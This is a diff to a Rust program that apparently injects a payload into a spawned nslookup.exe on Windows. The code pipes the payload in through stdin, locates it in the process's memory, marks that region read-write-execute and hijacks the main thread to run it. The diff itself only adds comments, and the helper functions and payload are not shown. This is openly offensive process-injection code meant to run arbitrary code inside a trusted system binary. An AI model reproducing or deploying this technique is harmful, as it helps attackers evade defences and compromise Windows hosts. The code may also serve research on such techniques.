@@ -25,6 +25,7 @@ fn main() {
     // fill startup info
     let reserved = PSTR::null();
 
+    // send handler to the new created process
     let si: STARTUPINFOA = STARTUPINFOA { 
         cb: std::mem::size_of::<STARTUPINFOA>() as u32, 
         lpReserved: reserved,
@@ -99,6 +100,7 @@ fn main() {
     let mut byte_written: u32= 0;
     let mut overlapped = OVERLAPPED{..Default::default()};
 
+    // send payload throught pipe
     let result = unsafe {
         //lpnumberofbytewritten w/o coercion, lpoverlapped w/ coercion
         WriteFile(my_handle.h_std_in_write, Some(&buffer), Some(&mut byte_written as *mut u32), Some(&mut overlapped)) 
@@ -112,6 +114,7 @@ fn main() {
     let mut buffer_out:[u8;512] = [0;512];
     let mut byte_read: u32 = 0;
 
+    // recieve data from pipe
     let result = unsafe { 
         ReadFile(my_handle.h_std_out_read, Some(&mut buffer_out),Some(&mut byte_read), Some(&mut overlapped))
     };
@@ -123,6 +126,7 @@ fn main() {
         Err(e) => println!("[-] Error while recieved: {e}")
     }
 
+    // find where the payload is store in process memory
     let ns_handle : HANDLE = pi.hProcess;
     let result = find_offset(ns_handle, &buffer);
 
@@ -134,6 +138,7 @@ fn main() {
     // change protection to RWX in the region that contain the payload
     change_protect(ns_handle, &mem_info);
 
+    // try to hijack main thread
     let ns_thread: HANDLE = pi.hThread;
     let offset: u64 = mem_info.offset as u64; 
     hijack_main_thread(ns_thread, offset);
@@ -141,13 +146,16 @@ fn main() {
     byte_written = 0;
     let mut overlapped = OVERLAPPED{..Default::default()};
     let input = b"\n";
+    
+    // this write is use to unblock the main thread of nslookup.exe
     let _ = unsafe {
         WriteFile(my_handle.h_std_in_write, Some(input), Some(&mut byte_written), Some(&mut overlapped))
     };
     println!("[*] Triggered ReadFile with {} bytes", byte_written);
 
+    // clean the handle
     unsafe {
-    
+        
         let _ = CloseHandle(my_handle.h_std_in_write);
         let _ = CloseHandle(my_handle.h_std_out_read);
         let _ = CloseHandle(pi.hProcess);
